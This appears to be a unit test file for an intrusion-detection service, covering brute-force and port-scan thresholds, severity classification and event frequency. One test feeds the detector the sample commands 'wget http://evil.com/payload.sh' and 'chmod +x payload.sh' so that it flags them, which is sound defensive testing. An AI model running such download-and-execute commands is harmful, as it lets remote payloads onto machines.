"""
Unit tests for detection and classification rules.
"""

from datetime import datetime, timedelta, timezone
from app.services import detection


def test_is_brute_force():
    assert not detection.is_brute_force(4)
    assert detection.is_brute_force(5)
    assert detection.is_brute_force(20)


def test_is_port_scan():
    assert not detection.is_port_scan(9)
    assert detection.is_port_scan(10)
    assert detection.is_port_scan(50)


def test_find_high_risk_commands():
    cmds = ["ls -la", "pwd", "wget http://evil.com/payload.sh", "whoami", "chmod +x payload.sh"]
    matched = detection.find_high_risk_commands(cmds)
    assert len(matched) == 2
    assert "wget http://evil.com/payload.sh" in matched
    assert "chmod +x payload.sh" in matched


def test_classify_severity_critical_compromise():
    # Successful login + high risk command -> critical
    sev = detection.classify_severity(
        had_successful_login=True,
        high_risk_command_count=2,
        is_brute_force_flag=False,
        is_port_scan_flag=False,
        is_repeated_attack_flag=False,
        is_abnormal_flag=False,
    )
    assert sev == "critical"


def test_classify_severity_brute_force():
    sev = detection.classify_severity(
        had_successful_login=False,
        high_risk_command_count=0,
        is_brute_force_flag=True,
        is_port_scan_flag=False,
        is_repeated_attack_flag=False,
        is_abnormal_flag=False,
    )
    assert sev == "medium"


def test_classify_severity_repeat_escalation():
    # Brute force (medium) escalated to high due to repeat attack flag
    sev = detection.classify_severity(
        had_successful_login=False,
        high_risk_command_count=0,
        is_brute_force_flag=True,
        is_port_scan_flag=False,
        is_repeated_attack_flag=True,
        is_abnormal_flag=False,
    )
    assert sev == "high"


def test_analyze_frequency():
    now = datetime.now(timezone.utc)
    ts_list = [now, now + timedelta(minutes=10), now + timedelta(minutes=20), now + timedelta(minutes=30)]
    res = detection.analyze_frequency(ts_list)
    assert res["count"] == 4
    assert res["events_per_hour"] == 8.0
